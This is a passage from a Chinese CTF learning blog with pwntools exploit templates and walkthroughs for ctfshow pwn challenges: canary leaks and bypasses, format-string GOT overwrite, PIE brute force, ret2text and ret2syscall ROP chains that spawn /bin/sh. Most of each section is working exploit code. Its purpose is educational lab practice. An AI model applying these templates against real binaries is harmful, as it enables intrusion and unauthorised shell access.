+<h2 id="覆盖截断字符获取Canary"><a href="#覆盖截断字符获取Canary" class="headerlink" title="覆盖截断字符获取Canary"></a>覆盖截断字符获取Canary</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> <span class="type">int</span> <span class="title function_">ctfshow</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [esp+0h] [ebp-D8h]</span></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">200</span>]; <span class="comment">// [esp+4h] [ebp-D4h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v3; <span class="comment">// [esp+CCh] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readgsdword(<span class="number">0x14u</span>);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">1</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    read(<span class="number">0</span>, buf, <span class="number">0x200u</span>);</span><br><span class="line">    <span class="built_in">printf</span>(buf);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readgsdword(<span class="number">0x14u</span>) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">backdoor</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>exp</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#r = remote(&quot;pwn.challenge.ctf.show&quot;, xxxxx)</span></span><br><span class="line">r = process(<span class="string">&quot;./pwn115&quot;</span>)</span><br><span class="line">elf =ELF(<span class="string">&#x27;./pwn115&#x27;</span>)</span><br><span class="line">backdoor = elf.sym[<span class="string">&quot;backdoor&quot;</span>]</span><br><span class="line"><span class="comment">#泄露canary</span></span><br><span class="line">r.recvuntil(<span class="string">&quot;Try Bypass Me!&quot;</span>)</span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span>*<span class="number">200</span> <span class="comment">#buf的偏移值</span></span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.recvuntil(<span class="string">b&quot;A&quot;</span>*<span class="number">200</span>)</span><br><span class="line">Canary = u32(r.recv(<span class="number">4</span>))-<span class="number">0xa</span> <span class="comment">#0xa是剪掉上面的换行</span></span><br><span class="line">log.info(<span class="string">&quot;Canary&quot;</span>+<span class="built_in">hex</span>(Canary))</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&quot;A&quot;</span>*<span class="number">200</span> + p32(Canary)+<span class="string">b&quot;A&quot;</span>*<span class="number">0x0c</span>+p32(backdoor)</span><br><span class="line"></span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="格式化字符串劫持-stack-chk-fail指针"><a href="#格式化字符串劫持-stack-chk-fail指针" class="headerlink" title="格式化字符串劫持__stack_chk_fail指针"></a>格式化字符串劫持__stack_chk_fail指针</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">r = process(<span class="string">&#x27;./pwn118&#x27;</span>)</span><br><span class="line"><span class="comment">#r = remote(&#x27;pwn.challenge.ctf.show&#x27;,xxxxx)</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn118&#x27;</span>)</span><br><span class="line"></span><br><span class="line">stack_chk_fail_got = elf.got[<span class="string">&#x27;__stack_chk_fail&#x27;</span>]</span><br><span class="line">getflag = elf.sym[<span class="string">&#x27;get_flag&#x27;</span>]</span><br><span class="line"></span><br><span class="line">payload = fmtstr_payload(<span class="number">7</span>, &#123;stack_chk_fail_got: getflag&#125;)</span><br><span class="line">payload = payload.ljust(<span class="number">0x5c</span>, <span class="string">b&#x27;a&#x27;</span>) <span class="comment">#偏移量根据实际情况定</span></span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.recv()</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="canary-格式化字符串"><a href="#canary-格式化字符串" class="headerlink" title="canary,格式化字符串"></a>canary,格式化字符串</h2><p>见另一篇<a href="http://linkpwn.github.io/2025/02/11/pwn98-canary-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/">文章</a></p>
+<h2 id="覆盖TCB来实现对canary的绕过"><a href="#覆盖TCB来实现对canary的绕过" class="headerlink" title="覆盖TCB来实现对canary的绕过"></a>覆盖TCB来实现对canary的绕过</h2><p>还是没搞懂，等搞懂了再来写，先留个模板–来自<a target="_blank" rel="noopener" href="https://zx2023qj.github.io/2024/09/20/pwn111-134bypass%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/">佬的blog</a>。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#r = process(&#x27;./pwn120&#x27;)</span></span><br><span class="line">r = remote(<span class="string">&#x27;pwn.challenge.ctf.show&#x27;</span>,<span class="string">&#x27; 28206&#x27;</span>)</span><br><span class="line"><span class="comment">#context(arch=&#x27;amd64&#x27;,os=&#x27;linux&#x27;,log_level=&#x27;debug&#x27;)</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn120&#x27;</span>)</span><br><span class="line"></span><br><span class="line">pop_rdi_ret = <span class="number">0x4007d8</span></span><br><span class="line">pop_rsi_r15_ret = <span class="number">0x400be1</span></span><br><span class="line">leave_ret = <span class="number">0x40098c</span></span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>] </span><br><span class="line">puts_plt = elf.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">read_plt = elf.sym[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">bss_addr = <span class="number">0x602010</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x510</span> + p64(bss_addr - <span class="number">0x8</span>)</span><br><span class="line">payload += p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt)</span><br><span class="line">payload += p64(pop_rdi_ret) + p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(pop_rsi_r15_ret) + p64(bss_addr) + p64(<span class="number">0</span>) + p64(read_plt)</span><br><span class="line">payload += p64(leave_ret)</span><br><span class="line"></span><br><span class="line">payload = payload.ljust(<span class="number">0x1000</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r.sendlineafter(<span class="string">&quot;How much do you want to send this time?\n&quot;</span>,<span class="built_in">str</span>(<span class="number">0x1000</span>))</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">r.send(payload)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">r.recvuntil(<span class="string">&quot;See you next time!\n&quot;</span>)</span><br><span class="line">puts_addr = u64(r.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(puts_addr))</span><br><span class="line">libc = LibcSearcher(<span class="string">&quot;puts&quot;</span>,puts_addr)</span><br><span class="line">libc_base = puts_addr - libc.dump(<span class="string">&quot;puts&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 由于使用的不是题目虚拟机，这里也就没有对应的libc库，所以直接用wp里面给的，当然也可以直接把可能的libc全试一遍，但是这里就不这么做了。</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 正确的libc是libc6_2.27-3ubuntu1.6_amd64</span></span><br><span class="line"></span><br><span class="line">one_gadget = libc_base + <span class="number">0x4f302</span></span><br><span class="line"></span><br><span class="line">payload = p64(one_gadget)</span><br><span class="line">r.send(payload)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
+
+<h2 id="PIE绕过"><a href="#PIE绕过" class="headerlink" title="PIE绕过"></a>PIE绕过</h2><h3 id="爆破pie"><a href="#爆破pie" class="headerlink" title="爆破pie"></a>爆破pie</h3><p>模板</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># context(log_level=&#x27;debug&#x27;)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">padding = <span class="number">0x18</span> + <span class="number">0x4</span></span><br><span class="line">backdoor = <span class="string">b&quot;\xF0&quot;</span> + <span class="string">b&quot;\x06&quot;</span> <span class="comment">#backdoor的地址</span></span><br><span class="line">payload = <span class="string">b&quot;A&quot;</span> * padding + backdoor</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">count = <span class="number">1</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">	r = process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">	<span class="keyword">try</span>:</span><br><span class="line">		count += <span class="number">1</span></span><br><span class="line">		<span class="built_in">print</span>(count,end=<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">		r.recvuntil(<span class="string">b&quot;xxxxxxxx&quot;</span>) <span class="comment">#根据具体情况</span></span><br><span class="line">		r.send(payload)</span><br><span class="line">		recv = r.recv(timeout=<span class="number">10</span>)</span><br><span class="line">	<span class="keyword">except</span>:</span><br><span class="line">		<span class="built_in">print</span>(<span class="string">&quot;error&quot;</span>,end=<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		r.interactive()</span><br><span class="line">		<span class="keyword">break</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="格式化字符串泄露pie和partial-write"><a href="#格式化字符串泄露pie和partial-write" class="headerlink" title="格式化字符串泄露pie和partial write"></a>格式化字符串泄露pie和partial write</h3><p>推荐个<a target="_blank" rel="noopener" href="https://xz.aliyun.com/news/12255?u_atoken=37fc6f7aae7e8e30badd1dee47edfe42&u_asig=1a0c39d417411687232004179e0034&time__1311=n4mx2iitKWqQwxCqD5DsD7fbD=Kq0IEYveIoK=x">佬的博客</a>(格式化和32位pw)</p>
+<p><a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/2063640">佬的博客2</a>(64位pw)</p>
+<p>64位模板</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r=process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">elf=ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"></span><br><span class="line">context.log_level=<span class="string">&quot;debug&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#Step1 leak canary &amp; ret_addr</span></span><br><span class="line">r.recvuntil(<span class="string">b&quot;xxxxx&quot;</span>)</span><br><span class="line">payload1=<span class="string">b&quot;a&quot;</span>*<span class="number">36</span>+<span class="string">b&quot;bbbb&quot;</span></span><br><span class="line">r.sendline(payload1)</span><br><span class="line">r.recvuntil(<span class="string">b&quot;bbbb&quot;</span>)</span><br><span class="line">canary=u64(p.recv(<span class="number">8</span>))-<span class="number">0x0a</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;leak canary:&quot;</span>,<span class="built_in">hex</span>(canary))</span><br><span class="line"></span><br><span class="line"><span class="comment">#Step2 overwrite</span></span><br><span class="line">r.recvuntil(<span class="string">b&quot;:\n&quot;</span>)</span><br><span class="line"><span class="comment">#b&quot;\x3E\x8A&quot;是getshell的地址</span></span><br><span class="line">payload2=<span class="string">b&quot;a&quot;</span>*<span class="number">0x28</span>+p64(canary)+<span class="string">b&quot;a&quot;</span>*<span class="number">8</span>+<span class="string">b&quot;\x3E\x8A&quot;</span> <span class="comment"># luckly~</span></span><br><span class="line">r.send(payload2)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="利用vsyscall地址不变"><a href="#利用vsyscall地址不变" class="headerlink" title="利用vsyscall地址不变"></a>利用vsyscall地址不变</h3><p>记录一下有这个方式，到时候了解了在写</p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://linkpwn.github.io/2025/03/02/ret2syscall/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.jpg">
+      <meta itemprop="name" content="linkpwn">
+      <meta itemprop="description" content="linkpwn的学习经历">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="网络幻影">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2025/03/02/ret2syscall/" class="post-title-link" itemprop="url">ret2syscall</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2025-03-02 04:17:51 / 修改时间：16:17:41" itemprop="dateCreated datePublished" datetime="2025-03-02T04:17:51+08:00">2025-03-02</time>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h2 id="PWN中栈溢出的部分简单题型"><a href="#PWN中栈溢出的部分简单题型" class="headerlink" title="PWN中栈溢出的部分简单题型"></a>PWN中栈溢出的部分简单题型</h2><h3 id="Ret2text"><a href="#Ret2text" class="headerlink" title="Ret2text"></a>Ret2text</h3><p>这类题型里：</p>
+<p>1、存在能够覆盖返回地址的栈溢出</p>
+<p>2、程序代码中直接存在类似于**system(“bin&#x2F;sh”)**能够直接获取程序控制权的代码。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">这段代码向系统申请一个sh的用户shell，可以获得当前交互主机的控制权bash</span><br></pre></td></tr></table></figure>
+
+
+
+<p>造成栈溢出的最常见的情形：</p>
+<p>1、gets()，由于gets()函数不限制读入的长度，所以一般看到程序中出现了gets()读取用户输入的情况，大概率是存在栈溢出的。</p>
+<p>2、限制长度读入函数，规定读入的长度大于变量与rbp&#x2F;ebp之间的距离，例如下图：</p>
+<p><img src="/2025/03/02/ret2syscall/Clip_2024-12-04_16-53-33.png" alt="Clip_2024-12-04_16-53-33"></p>
+<p>虽然read(0,buf,0x32uLL)限制了向buf内读入的长度为0x32，但是buf与rbp之间的距离只有0xA，就存在0x32-0xA&#x3D;0x28的长度是可以溢出的。</p>
+<h4 id="例题1："><a href="#例题1：" class="headerlink" title="例题1："></a>例题1：</h4><p>CTFshow - pwn38</p>
+<p>64位ret2text</p>
+<p>pwn基本解题流程：</p>
+<p>1、checksec检查程序基本信息：</p>
+<p>2、为程序添加可执行权：</p>
+<p>chmod +x pwn</p>
+<p>3、IDA反编译分析程序结构。</p>
+<p>4、gdb动态分析、调试。</p>
+<p>5、编写攻击脚本exp。</p>
+<p>checksec查看程序基本信息：</p>
+<p><img src="/2025/03/02/ret2syscall/Clip_2024-12-04_17-38-43.png" alt="Clip_2024-12-04_17-38-43"></p>
+<p>IDA反编译分析：</p>
+<p>主函数：</p>
+<p>存在0x32-0xA &#x3D; 0x28长度的栈溢出。</p>
+<p><img src="/2025/03/02/ret2syscall/Clip_2024-12-04_17-02-34.png" alt="Clip_2024-12-04_17-02-34"></p>
+<p>后门函数：</p>
+<p>存在system(“&#x2F;bin&#x2F;sh”)</p>
+<p><img src="/2025/03/02/ret2syscall/image-20240514131905819.png" alt="image-20240514131905819"></p>
+<img src="/2025/03/02/ret2syscall/Clip_2024-12-04_17-10-38.png" alt="Clip_2024-12-04_17-10-38" style="zoom:50%;">
+
+<p>gdb调试：</p>
+<p>在这道题中：</p>
+<p>0x7fffffffdc00是buf的起始地址，大小为0xA，rbp是buf+0xA 也就是图中的0x7fffffffdc10，而紧跟着rbp后面的就是函数的返回地址，ret address，我们只需要通过栈溢出将ret address改写成我们想要让程序返回的地方即可达到攻击的目的。</p>
+<p><img src="/2025/03/02/ret2syscall/Clip_2024-12-04_17-15-39.png" alt="Clip_2024-12-04_17-15-39"></p>
+<p>编写攻击脚本exp:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#io = process(&quot;./pwn&quot;)</span></span><br><span class="line">io = remote(<span class="string">&quot;pwn.challenge.ctf.show&quot;</span>,<span class="number">28308</span>)<span class="comment">#与远程建立连接。</span></span><br><span class="line"></span><br><span class="line">io.recv()<span class="comment">#接收程序的输出</span></span><br><span class="line"></span><br><span class="line">ret = <span class="number">0x400287</span> <span class="comment">#ROPgadget --binary pwn --only &quot;ret&quot;，用于寻找程序中的ret指令的地址。</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span> *(<span class="number">0xA</span>+<span class="number">8</span>) +p64(ret)+ p64(<span class="number">0x400657</span>)</span><br><span class="line"><span class="comment">#用（0xA+8）长度的垃圾数据&#x27;A&#x27;来填充距离，再接上p64(ret)进行堆栈平衡,最后接上后门函数的地址。</span></span><br><span class="line">io.sendline(payload)<span class="comment">#发送构造的payload</span></span><br><span class="line">io.interactive()<span class="comment">#进入交互模式</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="例题2："><a href="#例题2：" class="headerlink" title="例题2："></a>例题2：</h4><p>CTFshow——pwn37</p>
+<p>32位ret2text</p>
+<p>与64位原理一样，要修改成32位的格式:</p>
+<p><img src="/2025/03/02/ret2syscall/Clip_2024-12-04_17-35-34.png" alt="Clip_2024-12-04_17-35-34"></p>
+<p>exp:</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"><span class="comment">#io = remote(&quot;pwn.challenge.ctf.show&quot;,28308)#与远程建立连接。</span></span><br><span class="line"></span><br><span class="line">io.recv()<span class="comment">#接收程序的输出</span></span><br><span class="line"></span><br><span class="line">ret = <span class="number">0x08048356</span> <span class="comment">#ROPgadget --binary pwn --only &quot;ret&quot;，用于寻找程序中的ret指令的地址。</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span> *(<span class="number">0x12</span>+<span class="number">4</span>) + p32(ret) + p32(<span class="number">0x08048521</span>)</span><br><span class="line"><span class="comment">#用（0x12+4）长度的垃圾数据&#x27;A&#x27;来填充距离，再接上p32(ret)进行堆栈平衡,最后接上后门函数的地址。</span></span><br><span class="line">io.sendline(payload)<span class="comment">#发送构造的payload</span></span><br><span class="line">io.interactive()<span class="comment">#进入交互模式</span></span><br></pre></td></tr></table></figure>
+
+<p>不同点在于p32()以及ebp的长度由8变为4。</p>
+<h3 id="ret2syscall"><a href="#ret2syscall" class="headerlink" title="ret2syscall"></a>ret2syscall</h3><h4 id="x32"><a href="#x32" class="headerlink" title="x32"></a>x32</h4><p>ctfshow pwn入门 pwn71</p>
+<p>栈溢出</p>
+<p><img src="/2025/03/02/ret2syscall/image-20240517134955943.png" alt="image-20240517134955943"></p>
+<p>静态编译，可以通过ret2syscall</p>
+<p>我们可以利用程序中的 gadgets 来获得shell，而对应的 shell 获取则是利用系统调用。<br>简单地说，只要我们把对应获取 shell 的系统调用的参数放到对应的寄存器中，那么我们在执行 int0x80 就可执行对应的系统调用。比如说这里我们利用如下系统调用来获取 shel</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">execve(<span class="string">&quot;/bin/sh&quot;</span>,NULL,NULL)</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">其中，该程序是 32 位，所以我们需要使得</span><br><span class="line">系统调用号，pop eax 0xb ret | 即 eax 应该为32位execve的进程号0xb</span><br><span class="line">第一个参数，pop ebx /bin/sh ret | 即 ebx 应该指向 /bin/sh 的地址，其实执行 sh 的地址也可以。</span><br><span class="line">第二个参数，pop ecx 0 ret | 即 ecx 应该为 0 </span><br><span class="line">第三个参数，pop edx 0 ret | 即 edx 应该为 0 </span><br><span class="line">最后，     int 0x80 | x86 通过 int 0x80 指令进行系统调用</span><br></pre></td></tr></table></figure>
+
+<p>我们需要pop eax ret，pop ebx ret ,pop ecx ret ,pop edx ret</p>
+<p>&#x2F;bin&#x2F;sh的地址：</p>
+<p><img src="/2025/03/02/ret2syscall/Clip_2025-01-20_14-19-55.png" alt="Clip_2025-01-20_14-19-55"></p>
+<p><img src="/2025/03/02/ret2syscall/image-20240517135045415.png" alt="image-20240517135045415"></p>
+<p>这个可以利用</p>
+<p><img src="/2025/03/02/ret2syscall/image-20240517135156006.png" alt="image-20240517135156006"></p>
+<p>还有int 0x80</p>
+<p><img src="/2025/03/02/ret2syscall/image-20240517135849625.png" alt="image-20240517135849625"></p>
+<p>在ida中的偏移有问题，要在gdb中动调算:</p>
+<p><img src="/2025/03/02/ret2syscall/Clip_2025-01-20_14-30-35.png" alt="Clip_2025-01-20_14-30-35"></p>
+<p>exp：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="comment">#io = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">io=remote(<span class="string">&#x27;pwn.challenge.ctf.show&#x27;</span>,<span class="number">28113</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"></span><br><span class="line">offset = <span class="number">0x6C</span> + <span class="number">4</span></span><br><span class="line">pop_eax = <span class="number">0x080bb196</span> <span class="comment"># pop eax ; ret</span></span><br><span class="line">pop_edx_ecx_ebx = <span class="number">0x0806eb90</span> <span class="comment"># pop edx ; pop ecx ; pop ebx ; ret</span></span><br><span class="line">bin_sh = <span class="built_in">next</span>(elf.search(<span class="string">b&quot;/bin/sh&quot;</span>))</span><br><span class="line">int_80h = <span class="number">0x08049421</span> <span class="comment"># int 0x80</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#payload = flat([&#x27;A&#x27;*offset,pop_eax,0xb,pop_edx_ecx_ebx,0,0,bin_sh,int_80h])</span></span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span>*offset + p32(pop_eax) + p32(<span class="number">0xb</span>) + p32(pop_edx_ecx_ebx) + p32(<span class="number">0</span>) + p32(<span class="number">0</span>) + p32(bin_sh) +p32(int_80h)</span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="x32-2"><a href="#x32-2" class="headerlink" title="x32-2"></a>x32-2</h4><p>ctfshow Pwn入门 pwn72</p>
+<p>32位ret2syscall，没有&#x2F;bin&#x2F;sh，利用read读入</p>
+<p>计算偏移，这里ida的偏移又是错的，应该是0x28</p>
+<p><img src="/2025/03/02/ret2syscall/Clip_2025-01-20_14-40-18.png" alt="Clip_2025-01-20_14-40-18"></p>
+<p>和之前一样，不同的地方是这次没有了&#x2F;bin&#x2F;sh</p>
+<p><img src="/2025/03/02/ret2syscall/Clip_2025-01-20_14-41-01.png" alt="Clip_2025-01-20_14-41-01"></p>
+<p><img src="/2025/03/02/ret2syscall/Clip_2025-01-20_14-41-18.png" alt="Clip_2025-01-20_14-41-18"></p>
+<p>在ida里面找到了read函数，可以利用read读入&#x2F;bin&#x2F;sh到bss段的一个地址，之后再ret2syscall时用这个地址即可</p>
